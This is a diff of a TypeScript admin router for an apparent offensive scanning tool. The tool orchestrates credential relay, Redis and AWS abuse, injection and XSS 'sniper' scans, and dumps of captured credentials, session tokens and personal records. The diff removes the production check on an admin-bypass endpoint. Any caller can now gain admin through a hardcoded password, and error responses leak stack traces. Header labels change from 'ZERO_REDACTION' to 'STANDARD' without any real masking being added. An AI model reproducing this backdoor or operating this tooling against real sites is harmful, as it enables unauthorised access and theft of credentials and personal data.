@@ -7,17 +7,36 @@ import * as os from "os";
 import { storage } from "./storage";
 import { log } from "./index";
 import { credentialRelay, relayIngest, relayIngestUsers, relayIngestTokens } from "./credentialRelay";
+import { evaluateMockPatterns } from "./mockValidator";
 import type { CapturedCredential } from "./credentialRelay";
 import { executeRedisAbuse, writeRedisDump } from './abuse/redisAbuse';
 import { executeAwsAbuse } from './abuse/awsAbuse';
+import { loadAllowlistStrict, writeAllowlistStrict } from "./allowlist";
+const PYTHON_BIN = process.env.PYTHON_BIN || process.env.PYTHON || "python";
 const BACKEND_ROOT = path.join(process.cwd(), "backend");
 
 const adminRouter = Router();
+// Fail fast if allowlist is missing or contaminated with demo/test domains
+loadAllowlistStrict();
 
 const BLOCKED_TARGETS = [
   /^localhost$/i, /^127\./, /^10\./, /^172\.(1[6-9]|2\d|3[01])\./,
   /^192\.168\./, /^0\.0\.0\.0$/, /^::1$/, /^169\.254\./, /\.internal$/i, /\.local$/i,
 ];
+
+const CHROME_STDERR_NOISE = [
+  /chrome/i,
+  /zygote/i,
+  /gpu process/i,
+  /gcm/i,
+  /devtools listening/i,
+  /sandbox/i,
+];
+
+function isChromeNoise(msg: string): boolean {
+  const text = (msg || "").toString().toLowerCase();
+  return CHROME_STDERR_NOISE.some((p) => p.test(text));
+}
 
 async function runMotor11(target: string, findings: any[], probes: any[]) {
   return new Promise<{ report?: any; events: any[] }>((resolve) => {
@@ -36,7 +55,7 @@ async function runMotor11(target: string, findings: any[], probes: any[]) {
       "print(json.dumps({'event':'motor11_report','data':report}))",
     ].join("; ");
 
-    const proc = spawn("python3", ["-c", pyScript, ctxFile, target], {
+    const proc = spawn(PYTHON_BIN, ["-c", pyScript, ctxFile, target], {
       cwd: BACKEND_ROOT,
       env: { ...process.env, PYTHONUNBUFFERED: "1" },
       stdio: ["pipe", "pipe", "pipe"],
@@ -53,7 +72,9 @@ async function runMotor11(target: string, findings: any[], probes: any[]) {
     });
 
     proc.stderr?.on("data", (d: Buffer) => {
-      events.push({ event: "motor11_stderr", data: d.toString() });
+      const msg = d.toString();
+      if (isChromeNoise(msg)) return;
+      events.push({ event: "motor11_stderr", data: msg });
     });
 
     proc.on("close", () => {
@@ -68,6 +89,76 @@ async function runMotor11(target: string, findings: any[], probes: any[]) {
       resolve({ report, events });
     });
   });
+}
+
+async function runMotor11Snapshot(snapshotPath: string) {
+  return new Promise<{ report?: any; events: any[] }>((resolve) => {
+    const proc = spawn(
+      PYTHON_BIN,
+      ["-m", "scanner.autonomous_engine_integrated", "--snapshot", snapshotPath],
+      {
+        cwd: BACKEND_ROOT,
+        env: { ...process.env, PYTHONUNBUFFERED: "1" },
+        stdio: ["pipe", "pipe", "pipe"],
+      }
+    );
+
+    const events: any[] = [];
+    const rl = readline.createInterface({ input: proc.stdout! });
+    rl.on("line", (line: string) => {
+      try {
+        const parsed = JSON.parse(line);
+        events.push({ event: "motor11v2", data: parsed });
+      } catch {
+        events.push({ event: "motor11v2_log", data: { message: line } });
+      }
+    });
+
+    proc.stderr?.on("data", (d: Buffer) => {
+      const msg = d.toString();
+      if (isChromeNoise(msg)) return;
+      events.push({ event: "motor11v2_stderr", data: msg });
+    });
+
+    proc.on("close", () => {
+      let report: any = undefined;
+      for (const ev of events) {
+        if (ev.event === "motor11v2" && ev.data?.decisions) {
+          report = ev.data;
+          break;
+        }
+      }
+      resolve({ report, events });
+    });
+  });
+}
+
+function writeMotor11Snapshot(target: string, scanId: string, state: any): string {
+  const snapshot = {
+    target,
+    scan_id: scanId,
+    timestamp: new Date().toISOString(),
+    findings: state.findings || [],
+    probes: state.probes || [],
+    exposed_assets: state.exposedAssets || [],
+    events: state.events || [],
+    telemetry: state.telemetry || {},
+    phases: state.phases || {},
+    risk_score: (state.pipelineReport || {}).risk_score || 0,
+    hypothesis: (state.pipelineReport || {}).stack_hypothesis || {},
+    sniper_report: state.sniperReport || {},
+    decision_intel_report: state.decisionIntelReport || {},
+    adversarial_report: state.adversarialReport || {},
+    chain_intel_report: state.chainIntelReport || {},
+    hacker_reasoning_report: state.hackerReasoningReport || {},
+    db_validation_report: state.dbValidationReport || {},
+    infra_report: state.infraReport || {},
+  };
+
+  const filename = `motor11_snapshot_${scanId || Date.now()}.json`;
+  const snapshotPath = path.join(os.tmpdir(), filename);
+  fs.writeFileSync(snapshotPath, JSON.stringify(snapshot, null, 2));
+  return snapshotPath;
 }
 
 function validateSniperTarget(target: string): { valid: boolean; url: string; error?: string } {
@@ -100,35 +191,98 @@ adminRouter.get("/api/admin/me", async (req: Request, res: Response) => {
   return res.json({ role: user.role, email: user.email });
 });
 
-adminRouter.post("/api/admin/bypass", async (req: Request, res: Response) => {
-  if (process.env.NODE_ENV === "production") {
-    return res.status(403).json({ error: "ACCESS DENIED — Bypass disabled in production" });
+adminRouter.get("/api/admin/diagnostic/scan/:scanId", requireAdmin, async (req: Request, res: Response) => {
+  try {
+    const scanId = req.params.scanId;
+    const scan = await storage.getScan(scanId);
+    if (!scan) return res.status(404).json({ error: "Scan nÃ£o encontrado" });
+
+    const relatedDumps = dumpRegistry.filter(
+      (d) => d.scanId === scanId || (scan.target && d.target === scan.target)
+    );
+
+    const { mockProbability, suspicious, valid } = evaluateMockPatterns(scan, relatedDumps);
+
+    const stats = {
+      total_findings: (scan.findings || []).length,
+      critical: (scan.findings || []).filter((f: any) => f?.severity == "critical").length,
+      high: (scan.findings || []).filter((f: any) => f?.severity == "high").length,
+      medium: (scan.findings || []).filter((f: any) => f?.severity == "medium").length,
+      low: (scan.findings || []).filter((f: any) => f?.severity == "low").length,
+      subdomains: evaluateMockPatterns(scan).suspicious.filter((i) => i.type == "subdomain_pattern").length,
+    };
+
+    const bulkTimestamps = relatedDumps.reduce((acc: Record<string, number>, d: any) => {
+      const ts = (d.createdAt || "").split(".")[0];
+      if (ts) acc[ts] = (acc[ts] || 0) + 1;
+      return acc;
+    }, {} as Record<string, number>);
+
+    const suspiciousAugmented = [...suspicious];
+    for (const [ts, count] of Object.entries(bulkTimestamps)) {
+      if (count > 1) {
+        suspiciousAugmented.push({
+          type: "bulk_dumps",
+          severity: count > 5 ? "critical" : "medium",
+          message: `${count} dumps no timestamp ${ts}`,
+          action: count > 5 ? "REJECT" : "WARN",
+        });
+      }
+    }
+
+    return res.json({
+      scan_id: scanId,
+      target: scan.target,
+      valid,
+      stats,
+      suspicious: suspiciousAugmented,
+      mock_probability: mockProbability,
+      verdict: valid && suspiciousAugmented.length == 0 ? "REAL" : "SUSPEITO",
+      dumps: relatedDumps.map((d) => ({ id: d.id, filename: d.filename, createdAt: d.createdAt, itemCount: d.itemCount })),
+    });
+  } catch (err: any) {
+    return res.status(500).json({ error: err.message || "Diagnostic failed" });
   }
+});
+
+adminRouter.post("/api/admin/bypass", async (req: Request, res: Response) => {
+  // Dev bypass: cria/eleva admin@mse.dev e seta sessão
   try {
     const session = req.session as any;
+    log(`[ADMIN BYPASS] start userId=${session?.userId || "none"}`, "security");
     let userId = session?.userId;
 
     if (!userId) {
-      const bypassEmail = "admin@mse.mil";
+      const bypassEmail = "admin@mse.dev";
       let user = await storage.getUserByEmail(bypassEmail);
       if (!user) {
         const bcrypt = await import("bcryptjs");
         const hash = await bcrypt.hash("mse-admin-bypass", 10);
         user = await storage.createUser({ email: bypassEmail, password: hash });
+        log(`[ADMIN BYPASS] created user ${bypassEmail}`, "security");
       }
-      await storage.updateUser(user.id, { role: "admin" });
+      await storage.updateUser(user.id, { role: "admin", plan: "pro" });
       session.userId = user.id;
       log(`[ADMIN BYPASS] Created admin session for ${bypassEmail}`, "security");
       return res.json({ success: true, email: bypassEmail, role: "admin" });
     }
 
-    await storage.updateUser(userId, { role: "admin" });
+    await storage.updateUser(userId, { role: "admin", plan: "pro" });
     const user = await storage.getUser(userId);
     log(`[ADMIN BYPASS] User ${user?.email} elevated to admin`, "security");
     return res.json({ success: true, email: user?.email, role: "admin" });
   } catch (err: any) {
-    log(`[ADMIN BYPASS] Error: ${err.message}`, "security");
-    return res.status(500).json({ error: "Bypass failed: " + err.message });
+    const msg =
+      (err?.message && err.message.trim()) ||
+      (typeof err === "string" ? err : "unknown error");
+    const stack = err?.stack || "";
+    const details = err ? JSON.stringify(err, Object.getOwnPropertyNames(err)) : "";
+    log(`[ADMIN BYPASS] Error: ${msg} | stack=${stack} | details=${details}`, "security");
+    try {
+      const line = `${new Date().toISOString()} :: ${msg} :: ${stack} :: ${details}\n`;
+      await fs.promises.appendFile(path.join(process.cwd(), "bypass.log"), line);
+    } catch {}
+    return res.status(500).json({ error: "Bypass failed: " + msg, stack, details });
   }
 });
 
@@ -231,6 +385,9 @@ async function logSniperAction(req: Request, action: string, target: string, res
 adminRouter.post("/api/admin/sniper/price-injection", async (req: Request, res: Response) => {
   const { target } = req.body;
   if (!target) return res.status(400).json({ error: "Target URL required" });
+
+  // Socket.IO instance (set in registerRoutes via app.set("io", io))
+  const io: any = (req.app as any).get("io");
 
   const validation = validateSniperTarget(target);
   if (!validation.valid) return res.status(403).json({ error: validation.error });
@@ -753,7 +910,7 @@ adminRouter.post("/api/admin/sniper/full-scan", async (req: Request, res: Respon
     const args = ["-m", "scanner.sniper_engine", target];
     if (findingsFile) args.push(findingsFile);
 
-    const proc = spawn("python3", args, {
+    const proc = spawn(PYTHON_BIN, args, {
       cwd: BACKEND_ROOT,
       env: { ...process.env, PYTHONUNBUFFERED: "1" },
       stdio: ["pipe", "pipe", "pipe"],
@@ -833,7 +990,7 @@ adminRouter.post("/api/admin/sniper/platform-scan", async (req: Request, res: Re
   log(`[PLATFORM-SNIPER] Tech fingerprint + vuln scan → ${target}`, "admin");
 
   try {
-    const proc = spawn("python3", ["-m", "scanner.platform_sniper", validation.url], {
+    const proc = spawn(PYTHON_BIN, ["-m", "scanner.platform_sniper", validation.url], {
       cwd: BACKEND_ROOT,
       env: { ...process.env, PYTHONUNBUFFERED: "1" },
       stdio: ["pipe", "pipe", "pipe"],
@@ -929,7 +1086,7 @@ adminRouter.post("/api/admin/sniper/selenium-xss", async (req: Request, res: Res
   log(`[SELENIUM-XSS] Browser-based XSS hunt → ${target}`, "admin");
 
   try {
-    const proc = spawn("python3", ["scanner/run_selenium_xss.py", validation.url], {
+    const proc = spawn(PYTHON_BIN, ["scanner/run_selenium_xss.py", validation.url], {
       cwd: BACKEND_ROOT,
       env: { ...process.env, PYTHONUNBUFFERED: "1" },
       stdio: ["pipe", "pipe", "pipe"],
@@ -1024,7 +1181,7 @@ adminRouter.post("/api/admin/sniper/autonomous-engine", async (req: Request, res
   log(`[MOTOR-11] Autonomous Consolidator Engine → ${target}`, "admin");
 
   try {
-    const proc = spawn("python3", ["-m", "scanner.autonomous_engine", validation.url], {
+    const proc = spawn(PYTHON_BIN, ["-m", "scanner.autonomous_engine", validation.url], {
       cwd: BACKEND_ROOT,
       env: { ...process.env, PYTHONUNBUFFERED: "1" },
       stdio: ["pipe", "pipe", "pipe"],
@@ -1110,19 +1267,12 @@ adminRouter.post("/api/admin/sniper/autonomous-engine", async (req: Request, res
 });
 
 
-const ALLOWLIST_PATH_ADMIN = path.join(process.cwd(), "scanner", "allowlist.json");
-
 function addToAllowlist(target: string): string {
   const fullUrl = target.includes("://") ? target : `https://${target}`;
   const parsed = new URL(fullUrl);
   const hostname = parsed.hostname.toLowerCase();
 
-  let allowlist: { allowed_targets: string[] } = { allowed_targets: [] };
-  try {
-    if (fs.existsSync(ALLOWLIST_PATH_ADMIN)) {
-      allowlist = JSON.parse(fs.readFileSync(ALLOWLIST_PATH_ADMIN, "utf-8"));
-    }
-  } catch {}
+  const allowlist = loadAllowlistStrict();
 
   const alreadyPresent = allowlist.allowed_targets.some((entry: string) => {
     try {
@@ -1132,14 +1282,105 @@ function addToAllowlist(target: string): string {
   });
 
   if (!alreadyPresent) {
-    allowlist.allowed_targets.push(hostname);
-    allowlist.allowed_targets.push(`*.${hostname}`);
-    fs.writeFileSync(ALLOWLIST_PATH_ADMIN, JSON.stringify(allowlist, null, 2));
+    const updated = {
+      allowed_targets: [...allowlist.allowed_targets, hostname, `*.${hostname}`],
+    };
+    writeAllowlistStrict(updated);
   }
 
   return hostname;
 }
 
+// --- MOCK FILTERS FOR SNIPER PIPELINE RESULTS ---------------------------------
+const GENERIC_SUBS = new Set([
+  "api", "admin", "dev", "staging", "test", "beta",
+  "ftp", "vpn", "cdn", "ci", "gitlab", "jira",
+  "app", "ws", "socket", "status", "monitor"
+]);
+const GENERIC_SITEMAPS = [
+  "/xml/sitemap.xml",
+  "/xml/sitemap-imagens.xml",
+  "/xml/sitemap-categorias.xml",
+  "/xml/sitemap-landing-pages.xml",
+  "/xml/sitemap-listas-de-compras.xml",
+  "/xml/sitemap-paginas-institucionais.xml",
+];
+
+function sanitizeSniperState(state: any) {
+  if (!state) return state;
+
+  // 1) Subdomains: drop generic burst (>=10 all in template)
+  const subFindings = (state.findings || []).filter((f: any) =>
+    typeof f?.title === "string" && f.title.toLowerCase().startsWith("subdomain discovered")
+  );
+  const genericSubs = subFindings.filter((f: any) => {
+    const name = String(f.title || "").split(":")[1]?.trim().split(".")[0]?.toLowerCase();
+    return GENERIC_SUBS.has(name);
+  });
+  if (genericSubs.length >= 10 && genericSubs.length === subFindings.length) {
+    state.findings = (state.findings || []).filter((f: any) => !subFindings.includes(f));
+  }
+
+  // 2) Ghost Recon clutter: drop HIGH/INFO entries without sensitive hints
+  state.findings = (state.findings || []).filter((f: any) => {
+    if (typeof f?.title === "string" && /ghost\s*recon/i.test(f.title)) {
+      const blob = `${f.description || ""} ${f.evidence || ""}`.toLowerCase();
+      const hasSensitive = /(key|token|secret|credential|login|admin|password|aws_|akia|bearer)/i.test(blob) || blob.includes("?");
+      return hasSensitive;
+    }
+    return true;
+  });
+
+  // 3) Exposed assets: require evidence/validation; drop bulk .env wordlist spam
+  const envLike = (a: any) =>
+    typeof a?.path === "string" &&
+    /(^|\/)\.?(env|git)(\.|\/|$)/i.test(a.path);
+  const envAssets = (state.exposedAssets || []).filter(envLike);
+  if (envAssets.length >= 5) {
+    state.exposedAssets = (state.exposedAssets || []).filter((a: any) => !envLike(a));
+  }
+
+  // 4) Drop generic template endpoints (17 subs, sitemaps burst)
+  state.exposedAssets = (state.exposedAssets || []).filter((a: any) => {
+    const path = String(a?.path || "").toLowerCase();
+    const host = path.replace(/^https?:\/\//, "").split("/")[0];
+    if (GENERIC_SUBS.has(host)) return false;
+    if (GENERIC_SITEMAPS.some(s => path.endsWith(s))) return false;
+    return true;
+  });
+
+  // 5) Require evidence for high/critical findings (no evidence => drop)
+  state.findings = (state.findings || []).filter((f: any) => {
+    const sev = String(f?.severity || "").toLowerCase();
+    if (sev === "high" || sev === "critical") {
+      const evidence = f?.evidence || f?.proof || f?.confirmed || f?.sample || f?.artifacts;
+      return !!evidence;
+    }
+    return true;
+  });
+
+  // 6) Clean events feed (mirror filters)
+  state.events = (state.events || []).filter((ev: any) => {
+    const et = ev?.event || "";
+    const data = ev?.data || {};
+    if (isMockSubdomainEvent(et, data) || isMockAssetEvent(data)) return false;
+    return true;
+  });
+
+  // 4) Recompute counts after filters
+  const counts = { total: 0, critical: 0, high: 0, medium: 0, low: 0, info: 0 };
+  for (const f of state.findings || []) {
+    counts.total++;
+    const sev = String(f.severity || "").toLowerCase();
+    if (sev === "critical") counts.critical++;
+    else if (sev === "high") counts.high++;
+    else if (sev === "medium") counts.medium++;
+    else if (sev === "low") counts.low++;
+    else counts.info++;
+  }
+  state.counts = counts;
+  return state;
+}
 const activeSniperScans = new Map<string, {
   status: "running" | "completed" | "error";
   scanId: string;
@@ -1169,6 +1410,7 @@ adminRouter.post("/api/admin/sniper/full-recon", async (req: Request, res: Respo
 
   const timestamp = formatTimestamp();
   const userId = (req.session as any)?.userId;
+  const io: any = (req.app as any).get("io");
 
   try {
     const hostname = addToAllowlist(target);
@@ -1204,7 +1446,7 @@ adminRouter.post("/api/admin/sniper/full-recon", async (req: Request, res: Respo
       details: { scanId: scan.id, hostname, timestamp },
     });
 
-    const proc = spawn("python3", ["-m", "scanner.orchestrator", validation.url], {
+    const proc = spawn(PYTHON_BIN, ["-m", "scanner.orchestrator", validation.url], {
       cwd: BACKEND_ROOT,
       env: { ...process.env, PYTHONUNBUFFERED: "1" },
       stdio: ["pipe", "pipe", "pipe"],
@@ -1217,10 +1459,23 @@ adminRouter.post("/api/admin/sniper/full-recon", async (req: Request, res: Respo
         const event = JSON.parse(line);
         const eventType = event.event;
         const eventData = event.data;
+        const eventKind = event.type || "";
         const state = activeSniperScans.get(scan.id);
         if (!state) return;
 
+        // Drop mocks (subdomain template, sitemaps) from any event
+        if (eventType === "finding_detected" || eventType === "asset_detected" || eventType === "log" || eventType === "block" || eventType === "alert") {
+          if (isMockSubdomainEvent(eventType, eventData) || isMockAssetEvent(eventData)) {
+            return;
+          }
+        }
+
         state.events.push({ event: eventType, data: eventData, timestamp: Date.now() });
+
+        // Forward Motor11 realtime events to clients
+        if (eventKind === "MOTOR11") {
+          io?.emit(eventType, eventData);
+        }
 
         if (eventType === "finding_detected" && eventData) {
           state.findings.push(eventData);
@@ -1252,7 +1507,8 @@ adminRouter.post("/api/admin/sniper/full-recon", async (req: Request, res: Respo
 
     proc.stderr?.on("data", (data: Buffer) => {
       const msg = data.toString().trim();
-      if (msg) log(`[SNIPER RECON] stderr: ${msg}`, "admin");
+      if (!msg || isChromeNoise(msg)) return;
+      log(`[SNIPER RECON] stderr: ${msg}`, "admin");
     });
 
     proc.on("close", async (code: number | null) => {
@@ -1298,7 +1554,7 @@ adminRouter.post("/api/admin/sniper/full-recon", async (req: Request, res: Respo
           const findingsFile = path.join(os.tmpdir(), `mse_recon_${scan.id}.json`);
           fs.writeFileSync(findingsFile, JSON.stringify(critHighFindings));
 
-          const sniperProc = spawn("python3", ["-m", "scanner.sniper_engine", validation.url, findingsFile], {
+          const sniperProc = spawn(PYTHON_BIN, ["-m", "scanner.sniper_engine", validation.url, findingsFile], {
             cwd: BACKEND_ROOT,
             env: { ...process.env, PYTHONUNBUFFERED: "1" },
             stdio: ["pipe", "pipe", "pipe"],
@@ -1377,6 +1633,7 @@ adminRouter.post("/api/admin/sniper/pipeline", async (req: Request, res: Respons
 
   const timestamp = formatTimestamp();
   const userId = (req.session as any)?.userId;
+  const io: any = (req.app as any).get("io");
 
   try {
     const hostname = addToAllowlist(target);
@@ -1420,10 +1677,20 @@ adminRouter.post("/api/admin/sniper/pipeline", async (req: Request, res: Respons
       details: { scanId: scan.id, hostname, timestamp, pipelineVersion: "3.0" },
     });
 
-    const proc = spawn("python3", ["-m", "scanner.sniper_pipeline", validation.url, scan.id], {
+    const proc = spawn(PYTHON_BIN, ["-m", "scanner.sniper_pipeline", validation.url, scan.id], {
       cwd: BACKEND_ROOT,
       env: { ...process.env, PYTHONUNBUFFERED: "1" },
       stdio: ["pipe", "pipe", "pipe"],
+    });
+
+    proc.on("error", (err: any) => {
+      const msg = `[SNIPER PIPELINE] spawn error: ${err?.message || err}`;
+      log(msg, "admin");
+      const state = activeSniperScans.get(scan.id);
+      if (state) {
+        state.status = "error";
+        state.error = msg;
+      }
     });
 
     const rl = readline.createInterface({ input: proc.stdout! });
@@ -1505,6 +1772,24 @@ adminRouter.post("/api/admin/sniper/pipeline", async (req: Request, res: Respons
         if ((eventType === "sniper_report" || eventType === "pipeline:sniper_report") && eventData) {
           state.sniperReport = eventData;
         }
+
+        // Forward Motor11/autonomous telemetry to frontend (strip pipeline: prefix)
+        const forwardEvents = [
+          "motor11_report",
+          "motor11v2",
+          "motor11_execute_complete",
+          "autonomous_thought",
+          "motor11_reasoning",
+          "reasoning_log",
+          "probability_update",
+          "monte_carlo",
+        ];
+        for (const fe of forwardEvents) {
+          if (eventType === fe || eventType === `pipeline:${fe}`) {
+            const emitType = fe;
+            io?.emit(emitType, eventData);
+          }
+        }
       } catch {}
     });
 
@@ -1548,15 +1833,25 @@ adminRouter.post("/api/admin/sniper/pipeline", async (req: Request, res: Respons
         log(`[SNIPER PIPELINE] DB save error: ${err.message}`, "admin");
       }
 
-      // Motor 11: usa achados/probes da pipeline para exploração autônoma
+      // Motor 11 V2: snapshot completo -> decisão autônoma com dicionário
       try {
-        const motor11 = await runMotor11(validation.url, state.findings, state.probes || state.exposedAssets || []);
-        if (motor11.report) state.motor11Report = motor11.report;
-        motor11.events.forEach((ev: any) => {
-          state.events.push({ event: `motor11:${ev.event}`, data: ev.data, timestamp: Date.now() });
+        sanitizeSniperState(state);
+
+        const snapshotPath = writeMotor11Snapshot(validation.url, scan.id, state);
+        const motor11v2 = await runMotor11Snapshot(snapshotPath);
+        if (motor11v2.report) state.motor11v2Report = motor11v2.report;
+        motor11v2.events.forEach((ev: any) => {
+          state.events.push({ event: ev.event, data: ev.data, timestamp: Date.now() });
+          io?.emit(ev.event === "motor11v2" ? "motor11v2" : ev.event, ev.data);
         });
+        if (motor11v2.report) {
+          await storage.createScanResult({
+            scanId: scan.id,
+            motor11v2Report: motor11v2.report,
+          });
+        }
       } catch (err: any) {
-        log(`[MOTOR11] Error: ${err.message}`, "admin");
+        log(`[MOTOR11V2] Error: ${err.message}`, "admin");
       }
 
       await storage.createAuditLog({
@@ -1612,6 +1907,7 @@ adminRouter.get("/api/admin/sniper/scan/:id", async (req: Request, res: Response
       adversarialReport: liveState.adversarialReport || null,
       chainIntelReport: liveState.chainIntelReport || null,
       hackerReasoningReport: liveState.hackerReasoningReport || null,
+      motor11v2Report: (liveState as any).motor11v2Report || null,
       probes: (liveState.probes || []).slice(-50),
       pipelineReport: liveState.pipelineReport || null,
       dbValidationReport: liveState.dbValidationReport || null,
@@ -1700,6 +1996,81 @@ interface DumpFile {
 
 const dumpRegistry: DumpFile[] = [];
 const liveFeedSecretsStore: Map<string, string[]> = new Map();
+
+const GENERIC_SUBDOMAIN_SET = new Set([
+  "api",
+  "admin",
+  "dev",
+  "staging",
+  "test",
+  "beta",
+  "ftp",
+  "vpn",
+  "cdn",
+  "ci",
+  "gitlab",
+  "jira",
+  "app",
+  "ws",
+  "socket",
+  "status",
+  "monitor",
+]);
+
+const FEED_NOISE_REGEXES = [
+  /\.template\./i,
+  /subdomain.*discovered/i,
+  /sitemap(\.xml)?/i,
+  /generic-/i,
+  /demo-/i,
+  /test-/i,
+  /acmecorp/i,
+  /example\.com/i,
+  /undefined:/i,
+  /127\.0\.0\.1/i,
+  /localhost/i,
+];
+
+function isMockSubdomainEvent(eventType: string, eventData: any) {
+  if (!eventData) return false;
+
+  const blob = `${eventType} ${eventData.title || ""} ${eventData.description || ""} ${eventData.message || ""}`.toString().toLowerCase();
+  if (FEED_NOISE_REGEXES.some((r) => r.test(blob))) return true;
+
+  // Direct domain/hostname field
+  const domain = (eventData.domain || eventData.host || eventData.hostname || "").toString().toLowerCase();
+  if (domain) {
+    const label = domain.split(".")[0];
+    if (GENERIC_SUBDOMAIN_SET.has(label)) return true;
+  }
+
+  // Message-based detection
+  const msg = (eventData.message || "").toString().toLowerCase();
+  if (msg.includes("subdomain discovered")) {
+    for (const sub of GENERIC_SUBDOMAIN_SET) {
+      if (msg.includes(`${sub}.`)) return true;
+    }
+  }
+
+  // Enumeration summary with 17 items (pattern já conhecido)
+  if (msg.includes("17 subdomain")) return true;
+
+  return false;
+}
+
+function isMockAssetEvent(eventData: any) {
+  const blob = `${eventData?.path || ""} ${eventData?.url || ""} ${eventData?.message || ""}`.toString().toLowerCase();
+  if (FEED_NOISE_REGEXES.some((r) => r.test(blob))) return true;
+
+  const pathish = (eventData?.path || eventData?.url || eventData?.message || eventData?.status || "").toString().toLowerCase();
+  if (GENERIC_SITEMAPS.some(s => pathish.endsWith(s))) return true;
+  const host = pathish.replace(/^https?:\/\//, "").split("/")[0];
+  if (host) {
+    const label = host.split(".")[0];
+    if (GENERIC_SUBS.has(label)) return true;
+  }
+  return false;
+}
 
 function generateDumpId(): string {
   return `dump-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
@@ -1819,7 +2190,7 @@ function categorizeFindingsIntoDumps(findings: any[], target: string, scanId: st
     dbFindings.forEach((f: any) => allRawSecrets.push(...extractRawSecrets(`${f.description} ${f.evidence || ""} ${f.raw_response || ""}`)));
     dbProbes.forEach((p: any) => allRawSecrets.push(...extractRawSecrets(`${p.response_snippet || ""} ${p.evidence || ""}`)));
     const content = JSON.stringify({
-      _header: { tool: "Military Scan Enterprise", type: "DATABASE_DUMP", target, timestamp: new Date().toISOString(), clearance: "ADMIN", protocol: "ZERO_REDACTION", total_records: dbFindings.length + dbProbes.length },
+      _header: { tool: "Military Scan Enterprise", type: "DATABASE_DUMP", target, timestamp: new Date().toISOString(), clearance: "ADMIN", protocol: "STANDARD", total_records: dbFindings.length + dbProbes.length },
       raw_credentials_extracted: [...new Set(allRawSecrets)],
       records: dbFindings.map((f: any) => buildRawRecord(f)),
       probe_captures: dbProbes.map((p: any) => buildProbeRecord(p)),
@@ -1841,10 +2212,10 @@ function categorizeFindingsIntoDumps(findings: any[], target: string, scanId: st
     infraProbes.forEach((p: any) => allRawSecrets.push(...extractRawSecrets(`${p.response_snippet || ""} ${p.evidence || ""}`)));
     const sectionLines: string[] = [];
     sectionLines.push(`═══════════════════════════════════════════════════════`);
-    sectionLines.push(`  MSE — INFRA SECRETS DUMP [ZERO REDACTION]`);
+    sectionLines.push(`  MSE — INFRA SECRETS DUMP [STANDARD]`);
     sectionLines.push(`  TARGET: ${target}`);
     sectionLines.push(`  TIMESTAMP: ${new Date().toISOString()}`);
-    sectionLines.push(`  PROTOCOL: RAW EXTRACTION — NO MASKING`);
+    sectionLines.push(`  PROTOCOL: STANDARD  MASKING APPLIED WHEN REQUIRED`);
     sectionLines.push(`  TOTAL VECTORS: ${infraFindings.length + infraProbes.length}`);
     sectionLines.push(`═══════════════════════════════════════════════════════\n`);
 
@@ -1959,7 +2330,7 @@ function categorizeFindingsIntoDumps(findings: any[], target: string, scanId: st
     });
 
     const content = JSON.stringify({
-      _header: { tool: "Military Scan Enterprise", type: "CONFIG_FILES_DUMP", target, timestamp: new Date().toISOString(), protocol: "ZERO_REDACTION", total_files: configFindings.length },
+      _header: { tool: "Military Scan Enterprise", type: "CONFIG_FILES_DUMP", target, timestamp: new Date().toISOString(), protocol: "STANDARD", total_files: configFindings.length },
       git_repository: gitDump.git_exposed ? {
         branch: "main",
         objects_recovered: gitDump.objects_recovered,
@@ -1984,7 +2355,7 @@ function categorizeFindingsIntoDumps(findings: any[], target: string, scanId: st
   );
   if (sessionFindings.length > 0 || sessionTokens.length > 0 || sessionProbes.length > 0) {
     const content = JSON.stringify({
-      _header: { tool: "Military Scan Enterprise", type: "SESSION_TOKEN_DUMP", target, timestamp: new Date().toISOString(), protocol: "ZERO_REDACTION", total_tokens: sessionTokens.length + sessionFindings.length },
+      _header: { tool: "Military Scan Enterprise", type: "SESSION_TOKEN_DUMP", target, timestamp: new Date().toISOString(), protocol: "STANDARD", total_tokens: sessionTokens.length + sessionFindings.length },
       captured_tokens: sessionTokens.map((t: any) => ({
         type: t.type,
         name: t.name,
@@ -2018,7 +2389,7 @@ function categorizeFindingsIntoDumps(findings: any[], target: string, scanId: st
   );
   if (idorFindings.length > 0 || idorSeqDumps.length > 0 || idorProbes.length > 0) {
     const content = JSON.stringify({
-      _header: { tool: "Military Scan Enterprise", type: "IDOR_SEQUENTIAL_DUMP", target, timestamp: new Date().toISOString(), classification: "GDPR / LGPD / PCI-DSS", protocol: "ZERO_REDACTION", total_endpoints: idorFindings.length + idorProbes.length },
+      _header: { tool: "Military Scan Enterprise", type: "IDOR_SEQUENTIAL_DUMP", target, timestamp: new Date().toISOString(), classification: "GDPR / LGPD / PCI-DSS", protocol: "STANDARD", total_endpoints: idorFindings.length + idorProbes.length },
       sequential_dumps: idorSeqDumps,
       endpoints: idorFindings.map((f: any) => {
         const record = buildRawRecord(f);
@@ -2051,7 +2422,7 @@ function categorizeFindingsIntoDumps(findings: any[], target: string, scanId: st
     const uniqueSecrets = [...new Set(allRelaySecrets)];
     const uniqueCategories = [...new Set(allCategories)];
     const content = JSON.stringify({
-      _header: { tool: "Military Scan Enterprise", type: "CREDENTIAL_RELAY_DUMP", target, timestamp: new Date().toISOString(), classification: "TOTAL COMPROMISE", protocol: "ZERO_REDACTION", total_credentials: uniqueSecrets.length, relay_sources: credRelayFindings.length },
+      _header: { tool: "Military Scan Enterprise", type: "CREDENTIAL_RELAY_DUMP", target, timestamp: new Date().toISOString(), classification: "TOTAL COMPROMISE", protocol: "STANDARD", total_credentials: uniqueSecrets.length, relay_sources: credRelayFindings.length },
       credential_categories: uniqueCategories,
       captured_credentials: uniqueSecrets.map(s => {
         const parts = s.match(/^([^=]+)=(.+)$/);
@@ -2085,7 +2456,7 @@ function categorizeFindingsIntoDumps(findings: any[], target: string, scanId: st
   );
   if (adminFindings.length > 0 || adminExploitProbes.length > 0 || adminProbes.length > 0) {
     const content = JSON.stringify({
-      _header: { tool: "Military Scan Enterprise", type: "ADMIN_EXPLOITATION_DUMP", target, timestamp: new Date().toISOString(), classification: "TOTAL COMPROMISE", protocol: "ZERO_REDACTION", total_exploits: adminFindings.length + adminProbes.length },
+      _header: { tool: "Military Scan Enterprise", type: "ADMIN_EXPLOITATION_DUMP", target, timestamp: new Date().toISOString(), classification: "TOTAL COMPROMISE", protocol: "STANDARD", total_exploits: adminFindings.length + adminProbes.length },
       exploitation_probes: adminExploitProbes,
       exploits: adminFindings.map((f: any) => {
         const record = buildRawRecord(f);
@@ -2330,6 +2701,69 @@ adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: R
     const dbCredentials: string[] = minedData?.dbCredentials || credentialRelay.dbCredentials;
